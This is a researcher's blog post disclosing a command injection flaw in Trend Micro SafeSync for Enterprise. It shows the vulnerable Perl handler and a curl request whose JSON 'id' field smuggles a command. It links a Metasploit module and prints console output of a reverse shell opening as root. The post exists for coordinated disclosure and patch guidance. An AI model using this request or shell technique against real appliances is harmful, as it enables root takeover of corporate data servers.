---
layout: post
title:  "Trend Micro Bug Hunting - Part II"
date:   2016-09-06 07:00:00
comments: true
categories: pentesting trendmicro
---


Trend Micro Safe Sync for Enterprise is affected by a remote command execution vulnerability. This vulnerability can be exploited by authenticated user on the web administration panel of Safe Sync for Enterprise to gain remote command execution with root privileges.

From Trend Micro documentation:

> Trend Micro(TM) SafeSync for Enterprise(TM) allows enterprises to securely synchronize, share, and manage corporate data. Deployed on premise and in a private cloud, SafeSync provides file encryption and document tagging to prevent unauthorized access to sensitive data. SafeSync also supports file version control and redundant file backup.
	       
I recommend anyone running SafeSync for Enterprise to apply the critical patch released by Trend Micro, available at the following location:

* Safesync Enhancement Pack 1 (SSFE 3.2) - [http://downloadcenter.trendmicro.com/index.php?regs=NABU&clk=latest&clkval=4887&lang_loc=1](http://downloadcenter.trendmicro.com/index.php?regs=NABU&clk=latest&clkval=4887&lang_loc=1)

Trend Micro Advisory is available on their [business support website](https://success.trendmicro.com/solution/1115193-security-bulletin-trend-micro-safesync-for-enterprise-ssfe-remote-code-execution-vulnerability)

#### Affected Versions

* Trend Micro Safe Sync for Enterprise up to version 3.2

### Authenticated RCE - Technical Description

The following Perl script do not sanitize user inputs prior to using them as parameters of system commands:

* /opt/SingleInstaller/MgmtUI/lib/MgmtUI/Controller/api/admin/ad.pm

An authenticated user can abuse this by injecting his own commands using different kind of operators such as &&, ; , >, <.

Let's look at the vulnerable component:

**/opt/SingleInstaller/MgmtUI/lib/MgmtUI/Controller/api/admin/ad.pm [lines 747-772]**

In the excerpt below, we can see that ```$server_id``` is directly initialiazed from unsanitized json data values and fed
to ad_changed_sync.py command as ```--sync``` and ```--updatehost``` parameters.

{% highlight perl %}
sub ad_sync_now_PUT {
  my ( $self, $c ) = @_;
  my $reqdata = $c->req->data;
  my $server_id = $reqdata->{id};

  my $result;
  eval {
    system("/opt/SingleInstaller/ad_module/ad_python/bin/python /opt/SingleInstaller/ad_module/ad_changed_sync.py --sync $server_id  --updatehost $server_id &");
  };
  my $e;

  if ( $e = Exception::Class->caught('InternalErrorException') ) {
    $c->response->status(500);
    $result = {
      code  => 'ERROR_INTERNAL_ERROR',
      error => $e->description
    };
  } else {
    $c->response->status(200);
    $result = {};
  }
  $c->stash->{json} = $result;
  $c->forward('View::JSON');
}
{% endhighlight %}


From a client point of view, this would happen like this:

<pre style="background-color:black; font-size:10pt;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
$ curl -X PUT -k -i 'https://safesync.local:3443/api/admin/ad/ad_sync_now' -H 'Accept: */*' -H 'Host: safesync.local:3443' -H 'Content-Type: application/json; charset=utf-8' -H 'Referer: https://safesync.local:3443/admin_ldap_integration.html' -H 'Cookie: mgmtui_session=268b871790680ba79c5de832b18549e6cb908e16' --data '{"id":"1; INJECTED COMMAND"}
</pre>

### Proof-of-Concept

Take a look at the Metasploit [module](https://github.com/QKaiser/metasploit-framework/blob/master/modules/exploits/linux/http/trendmicro_safesync_exec.rb) I wrote. It works to get a reverse shell as root but in a weird way, using interactive `sh` and FIFO files. This is because the injection happen within a `sh -c 'command'` call, meaning it will raise a "file descriptor not found" if you try the usual reverse shell in bash.

On the plus side, you can always use python if you can't live without tty.

<pre style="background-color:black; font-size:10pt;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
msf exploit(trendmicro_safesync_exec) > run
[*] Started reverse TCP handler on kali.local:4444
[*] Successfully logged in.
[*] Exploiting...
[*] Command shell session 12 opened (kali.local:4444 -> safesync.local:47333) at 2016-09-06 13:19:29 -0400
[*] Command Stager progress - 100.00% done (690/690 bytes)

/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# python -c 'import pty; pty.spawn("/bin/bash")'
root@appliance1:/#
</pre>

I doubt I'll try to merge the module upstream until I get it to work in a generic way (support for meterpreter stager).

### Conclusion

Once again, Trend Micro vulnerability team was great in handling this coordinated disclosure.

Part III will discuss yet another Trend Micro product where I managed to be greeted with ```#```. If everything goes as expected, advisory should be released by September 30th.


### Disclosure Timeline

* 2016-07-20: Advisory sent to Trend Micro 
* 2016-07-22: Trend Micro acknowledge the issue
* 2016-08-11: Trend Micro released patch
* 2016-09-06: Advisory publication
